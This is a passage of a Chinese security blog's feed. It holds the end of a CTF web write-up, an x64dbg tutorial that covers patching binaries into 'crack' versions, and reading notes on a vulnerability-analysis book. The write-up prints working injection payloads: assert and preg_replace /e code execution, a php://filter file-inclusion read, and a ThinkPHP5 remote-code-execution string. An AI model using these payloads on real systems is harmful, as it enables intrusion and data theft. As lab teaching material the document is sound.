class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现了<code>assert</code>函数，可以通过其来执行PHP代码，这里就是解题的关键。</p><p>构造payload：<code>fff&#39;)</code>用于闭合assert函数</p><p><code>fff&#39;) or exec(&quot;ls&quot;,$result);var_dump($result);//</code>          不行</p><p><code>fff&#39;) or include(&quot;data://text/plain,&lt;?php exec(&quot;ls&quot;,$result);var_dump($result);?&gt;&quot;);</code>      不行</p><p><code>fff&#39;) or system(&quot;cat templates/flag.php&quot;)//</code>      可行</p><h4 id="15-ics-05"><a href="#15-ics-05" class="headerlink" title="15_ics_05"></a>15_ics_05</h4><h5 id="描述-13"><a href="#描述-13" class="headerlink" title="描述"></a>描述</h5><p>是一个实际场景，只有设备维护中心的page能被点开</p><h5 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>文件包含</p></li><li><p><strong>ctype_alnum() 函数检测字符串是否全部为字母和(或)数字字符，如果文本中的每个字符都是字母或数字，则返回TRUE，否则返回FALSE。</strong></p></li><li><p><strong>&#x3D;&#x3D;正则表达式的修饰符：&#x3D;&#x3D;</strong></p><p><strong>i：</strong>ignore-不区分大小写<strong>g：</strong>global-全局匹配<strong>m：</strong>multi line-多行匹配</p></li><li><p>preg_replace函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br></code></pre></td></tr></table></figure><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li><li>$replacement: 用于替换的字符串或字符串数组。</li><li>$subject: 要搜索替换的目标字符串或字符串数组。</li><li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li><li>$count: 可选，为替换执行的次数。</li><li>&#x3D;&#x3D;<strong>&#x2F;e参数：可以传入 &#x2F;e 的修饰符，然后让代码执行</strong>&#x3D;&#x3D;</li></ul></li></ul><h5 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h5><p>首先检查网页源码，只有html没有php，没用，所以我们第一个任务是找到php源码，首先访问一下index.phps，返回400，没用，看一下有没有git泄露，访问<code>/.git/</code>也没有，那就继续看看页面有没有什么可以交互的地方，发现点击标题的时候，页面发生了变化。url多了一个<code>/?page=index.php</code>，页面也出现了index，<strong>那么后端有一个page点可以交互，目前能想到的有两种，sql注入和文件包含漏洞</strong>，能排除sql注入，因为修改payload为<code>page=hhh</code>时，页面直接回显hhh，说明是没有走数据库的。那么就文件包含了，payload如下：</p><p>**<code>page=php://filter/read=convert.base64-enocode/resource=index.php</code>**，然后直接就扒出index.php经过base64-encode编码后的源码，很顺利，居然没有过滤需要绕过，然后我们解码就可以得到源码了。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/ics05_1.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">posix_setuid</span>(<span class="hljs-number">1000</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[page];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$page</span>)) &#123;&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$page</span>; <span class="hljs-keyword">die</span>();<span class="hljs-meta">?&gt;</span>&lt;/p&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">else</span>&#123;&#125;<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;input&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;ta:text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Ok&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br>    <span class="hljs-keyword">die</span>();<br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其实看完源码可以发现，首先是有字符串的过滤检测的，但是刚好没有php的伪协议，所以很顺利地得到了源码。解题的关键应该是有注释后的那部分代码。</p><p>有一个X-Forward-For的检测，用插件绕过就行或者用BP自己写一下，然后有三个参数：<code>pat,rep,sub</code>，被<code>preg_replace</code>函数调用，可以使用&#x2F;e参数一段PHP代码，</p><p>payload:<code>?pat=/a/e&amp;rep=system(&quot;cat index.php&quot;);&amp;sub=a</code>，</p><p>有index.php的回显，说明可行，</p><p>那么继续构造payload：<code>?pat=/a/e&amp;rep=system(&quot;ls&quot;);&amp;sub=a</code>，</p><p>有回显<code>css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png</code>，东西大概率在<code>s3chahahahaDir</code>里，进去看看，果然有flag，也是个目录，里面有flag.php。</p><p>构造payload：<code>?pat=/a/e&amp;rep=system(&quot;cat s3chahahaDir/flag/flag.php&quot;);&amp;sub=a</code></p><p>在源码里出现了flag：cyberpeace{38067f93cbfb9366ec43674ebac38457}</p><h4 id="16-PHP-RCE"><a href="#16-PHP-RCE" class="headerlink" title="16_PHP_RCE"></a>16_PHP_RCE</h4><h5 id="描述-14"><a href="#描述-14" class="headerlink" title="描述"></a>描述</h5><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/php_rce_1.jpg"></p><h5 id="知识点-15"><a href="#知识点-15" class="headerlink" title="知识点"></a>知识点</h5><ul><li>ThinkPHP 漏洞之一：ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。</li><li>shell：<code>find / -name flag</code></li></ul><h5 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h5><p>第一次遇见ThinkPHP，去Github查阅一下POC，得到如下payload：</p><p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p><p>得到如下回显：</p><p><code>favicon.ico index.php robots.txt router.php static static</code>，不太像有flag的样子，不过检验一下漏洞是否可以利用。</p><p>接着构造<code>ls /</code>，发现根目录下有flag，cat出来，解决。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x64dbg基础使用指南</title>
    <link href="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h2 id="x64dbg的基本使用指南"><a href="#x64dbg的基本使用指南" class="headerlink" title="x64dbg的基本使用指南"></a>x64dbg的基本使用指南</h2><p>本篇是为了配合读书笔记，因为原书使用的都是32位的程序，但是目前都是x86-64的机器，所以就学习一下x64dbg。</p><p>在52的帖子里看到的一句话，现在还理解不透彻：<strong>破解的关键在于找到关键CALL</strong></p><span id="more"></span><p>本文参考文章：<a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1393075">1</a>，<a href="https://www.cnblogs.com/meowv/p/11428772.html">2</a></p><p>X64dbg更新很快，但作者对于帮助文档却惜墨如金，有很多实用的强大功能，都需要自己去摸索。<br>刚才提到寻找关键CALL，IDA虽然F5生成伪码功能强大，并且可以生成函数调用图，但对于复杂的调用看起来就很不直观。并且IDA只能单个文件静态分析，对于跨模块调用就无能为力。</p><h3 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h3><h4 id="什么是符号文件-pdb"><a href="#什么是符号文件-pdb" class="headerlink" title="什么是符号文件.pdb"></a>什么是符号文件.pdb</h4><p>​符号文件（Symbol Files）是一个数据信息文件。 它包含了应用程序二进制文件（比如：EXE、DLL等）调试信息，专门用来作调试之用，最终生成的可执行文件在运行时并不需要这个符号文件，但<strong>你的程序中所有的变量信息都记录在这个文件中。 所以调试应用程序时，这个文件是非常重要的</strong>。</p><h4 id="设置符号文件保存路径"><a href="#设置符号文件保存路径" class="headerlink" title="设置符号文件保存路径"></a>设置符号文件保存路径</h4><p>​符号文件通常很大，所以x64dbg自身不带有符号文件，需要自己手动下载和保存，但是默认设置相对路径不太方便，如果下载过符号文件，就会在同一文件夹下生成symbols文件夹，这样在x64dbg升级或者更换的时候非常不方便，所以自己新建一个专门的比较好</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-35-39.png"></p><p>在选项中，杂项，设置本地符号路径</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-38-21.png"></p><h4 id="使用符号文件"><a href="#使用符号文件" class="headerlink" title="使用符号文件"></a>使用符号文件</h4><p>很多情况下，x64dbg不会自动加载符号文件，大概率是防止同时加载过多导致程序崩溃，这时候就需要我们手动加载了</p><p>首先需要下载符号文件，打开符号页面，右键.dll，可以发现有下载选项，点击下载即可，但是由于是默认加载微软的符号服务器，所以建议打开代理下载😋</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-44-43.png"></p><p>这里也可以选择下载所有dll的符号，下载到我们之前设置的文件夹下😁</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-48-49.png"></p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>通常打开一个程序的界面分为4块：</p><p>反汇编，寄存器，内存，系统栈</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-55-47.png"></p><p>关于调试按钮，就自己看咯，在左上角那里，应该比较好理解的</p><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><p>搜索字符串：右键汇编代码区，搜索，选择搜索模块，选择搜索内容，单步运行到这里搜索当前模块的字符串内容结果，当然这个感觉没有IDA的好用😁，所以我一般是两个一起看</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-59-28.png"></p><p>双击就可以到字符串在反汇编处</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_11-03-29.png"></p><h4 id="编辑字符串"><a href="#编辑字符串" class="headerlink" title="编辑字符串"></a>编辑字符串</h4><p>下面学习如何修改字符串常量，首先在反汇编窗口定位到字符串位置，然后在该句信息的窗口双击虚拟内存地址，会x64dbg在内存窗口自动给你跳转到对应位置，</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-49-32.png"></p><p>用鼠标选中需要编辑的位置，右键打开二进制编辑器</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-54-15.png"></p><p>可以发现如果没有修改到原字符串的大小，是不会覆盖的，</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-56-18.png"></p><p>关于这里为什么能在反汇编中动态改变，是因为反汇编区域默认是将在内存中内容读取并解析成相关的汇编代码</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-10-08.png"></p><h4 id="一些配置"><a href="#一些配置" class="headerlink" title="一些配置"></a>一些配置</h4><p>在选项中，会有一些配置更改的设置，现在我们来看一看</p><ul><li>事件：就是x64dbg自动暂停的事件，这里也解释了我在阅读笔记1中的疑问，为什么会自动暂停，因为我之前安装的时候勾选了系统断点🤣，这里我们改回去，只保留在入口断点暂停</li></ul><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-40-13.png"></p><ul><li>对于引擎和异常保持默认即可</li><li>反汇编：我这里仅修改了图中三处</li></ul><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-44-13.png"></p><ul><li>杂项：可以将搜索引擎改为百度：<a href="https://www.baidu.com/s?wd=@topic">https://www.baidu.com/s?wd=@topic</a>  遇到不认识的函数选中，右键，符号名称帮助，直接进行查询。</li></ul><h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>在帮助里面</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-48-38.png"></p><h4 id="显示指令提示"><a href="#显示指令提示" class="headerlink" title="显示指令提示"></a>显示指令提示</h4><p>右键反汇编区，选择显示提示或隐藏</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-49-50.png"></p><h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><p>右键汇编区代码，然后选择补丁，修补文件即可发布crack版本，注意不要和源文件重名，快捷键Ctrl+P</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_15-06-36.png"></p><p>可以发现已经修改了字符串</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_15-08-34.png"></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件与系统安全</tag>
      
      <tag>逆向工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔1</title>
    <link href="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/"/>
    <url>/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔1"><a href="#0Day安全软件漏洞分析第2版阅读随笔1" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔1"></a>0Day安全软件漏洞分析第2版阅读随笔1</h1><p>最近发现了一本2011年再版的好书，《0Day安全软件漏洞分析第2版》，浅浅阅读了几章，发现对现在刚入门逆向工程的我来说有极大的帮助，便写下了这篇随笔。书的部分内容有些过时，我会结合现在的技术加以补充😉</p><span id="more"></span><h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章-基础知识"></a>第一章-基础知识</h2><h3 id="一些常识"><a href="#一些常识" class="headerlink" title="一些常识"></a>一些常识</h3><h4 id="公布漏洞的权威机构"><a href="#公布漏洞的权威机构" class="headerlink" title="公布漏洞的权威机构"></a>公布漏洞的权威机构</h4><p>（1） <a href="http://cve.mitre.org/">CVE (Common Vulnerabilities and Exposures)</a> 截至目前，这里收录了两万多个漏洞。CVE 会对每个公布的漏洞进行编号、审查。CVE 编号通常也是引用漏洞的标准方式。 </p><p>（2）<a href="http://www.cert.org/">CERT(Computer Emergency Response Team)</a> 计算机应急响应组往往会在第一时间跟进当前的严重漏洞，包括描述信息、POC 的发布链接、厂商的安全响应进度、 用户应该采取的临时性防范措施等。</p><h4 id="何为0Day"><a href="#何为0Day" class="headerlink" title="何为0Day"></a>何为0Day</h4><p>​        微软每个月第二周的星期二发布补丁，这一天通常被称为<code>Black Tuesday</code>，因为会有许多攻击者通宵达旦地去研究这些补丁 patch 了哪些漏洞，并写出 exploit。因为在补丁刚刚发布的一段时 间内，并非所有用户都能及时修复，故这种新公布的漏洞也有一定利用价值。有时把攻击这种 刚刚被 patch 过的漏洞称为 1 day 攻击（patch 发布后1天，叫做1day，5天叫做 5day，未发 patch 统称 0 day）</p><h4 id="必备工具"><a href="#必备工具" class="headerlink" title="必备工具"></a>必备工具</h4><h5 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h5><p>Ollydbg 是一个集成了反汇编分析、十六进制编辑、动态调试等多种功能于一身的功能强大的调试器。</p><p>但是仅支持动态调试32位的系统。</p><h5 id="IDAPro"><a href="#IDAPro" class="headerlink" title="IDAPro"></a>IDAPro</h5><p>IDA 好像是一张二进制的地图，通过它的标注功能可以迅速掌握大量汇编代码的架构，不至于在繁杂的二进制迷宫中迷失方向。目前版本的 IDA 甚至可以用图形方式显示出一个函数内部的执行流程。</p><h5 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h5><p>通过这款调试工具用户可以分析64位的应用，这是OllyDbg所不能做到的，它只能分析32位应用，所以想要分析64位应用，x64dbg是一款专门用于分析64位应用的调试软件。</p><h5 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a>二进制编辑器</h5><p>比较著名的十六进制编辑器包括 UltraEdit、Hex Workshop 和 WinHex 和 010 editor</p><h3 id="二进制文件概述"><a href="#二进制文件概述" class="headerlink" title="二进制文件概述"></a>二进制文件概述</h3><h4 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h4><p>​     <strong>PE，是<code>Portable Executable</code>的缩写，是<code>Win32</code>平台下可执行文件所遵守的数据格式。像<code>.exe</code>、<code>.dll</code>都是典型的PE文件。在文件执行时，操作系统会按照PE文件格式的约定去相应的地方调用资源，然后装入内存的不同区域。</strong></p><p>PE文件格式将可执行文件分为了几个数据节，一个典型的分节：</p><ul><li>.text: 由编译器产生，存放二进制的机器码，也是我们反汇编和调试的对象。</li><li>.data: 初始化的数据块，如宏定义、全局变量、静态变量等</li><li>.idata: 动态链接库等外来函数的信息</li><li>.rsrc: 程序资源，如图标、菜单等、</li></ul><p><strong>但我们需要注意的是，节可以被任意命名，并且代码的任意部分可以编译到PE的任意节中，如果可执行文件经过了“加壳”处理，PE 的节信息就会变得非常“古怪”。 在 Crack 和反病毒分析中需要经常处理这类古怪的 PE 文件。</strong></p><h4 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h4><p>在内核状态下，我们才能看到并调试物理内存。所以用户态下，我们用调试器看到的都是虚拟内存。Windows让所有的程序都认为自己拥有独立的4GB的内存，这当然是不可能的哈哈的😁</p><p>如下图展示：</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-25_22-21-19.png"></p><p>这里书中有个比喻非常精妙：</p><ul><li>内存管理机制就像银行</li><li>进程&#x3D;用户</li><li>内存管理器&#x3D;银行</li><li>物理内存&#x3D;现金</li><li>虚拟内存&#x3D;存款</li><li>当进程（用户）需要使用物理内存（现金）的时候，它就会向银行（内存管理器）申请将虚拟内存（存款）映射为物理内存。</li></ul><h4 id="PE文件与虚拟内存间的映射"><a href="#PE文件与虚拟内存间的映射" class="headerlink" title="PE文件与虚拟内存间的映射"></a>PE文件与虚拟内存间的映射</h4><p>​        在静态调试中，我们看到的某个指令的位置，它是当前函数调用相对于磁盘文件得到的，也就是文件偏移。我们还需要知道这条指令在内存中的位置，即虚拟内存地址。</p><ul><li><strong>文件偏移地址</strong>：数据在PE文件中相对于文件开头的地址，<strong>这里的意思就是文件没有运行的时候</strong>。</li><li><strong>装载基址</strong>：PE装入内存时的基地址。默认情况下，EXE 文件在虚拟内存中的基地址是 0x00400000，DLL 文件是 0x10000000。这些位置可以通过修改编译选项更改。</li><li><strong>虚拟内存地址</strong>：PE文件中机制被装入内存后的地址。</li><li><strong>相对虚拟地址</strong>：内存地址相对于映射基址的偏移量。</li><li><strong>相对虚拟地址&#x3D;虚拟内存地址-装载基址</strong></li></ul><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-25_22-58-02.png"></p><p>​        <strong>操作系统在装载时基本上不会破坏程序的各种数据结构，所以文件地址和相对虚拟地址有很大的一致性，但是存在存放基本单位的差别。</strong></p><ul><li>文件数据按0x200字节为基本单位进行组织，PE数据节的大小始终是0x200的整数倍</li><li>内存数据按0x1000字节为基本单位进行组织，内存数据节的大小始终是0x1000的整数倍</li><li>这种由文件单位引起的<strong>节基址差</strong>称作节偏移，所以<strong>文件偏移地址&#x3D;虚拟内存地址-装载基址-节地址差</strong></li></ul><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_13-32-23.png"></p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_13-32-38.png"></p><h3 id="crack-me1"><a href="#crack-me1" class="headerlink" title="crack_me1"></a>crack_me1</h3><p>实验代码来源于原书</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">&quot;1234567&quot;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>&#123; <br>    <span class="hljs-type">int</span> authenticated; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-keyword">return</span> authenticated; <br>&#125; <br><br>main() <br>&#123; <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) <br>    &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input password: &quot;</span>); <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,password); <br>        valid_flag = verify_password(password); <br>        <span class="hljs-keyword">if</span>(valid_flag) <br>        &#123; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;incorrect password!\n\n&quot;</span>); <br>        &#125; <br>        <span class="hljs-keyword">else</span> <br>        &#123; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); <br>            <span class="hljs-keyword">break</span>; <br>        &#125; <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>使用命令<code>gcc -o crack_me.exe test.c</code>编译为64位的exe文件，当然如果你不是<code>x86-64</code>架构，那么命令有所变化，需要编为32位的程序😋。</p><p><img 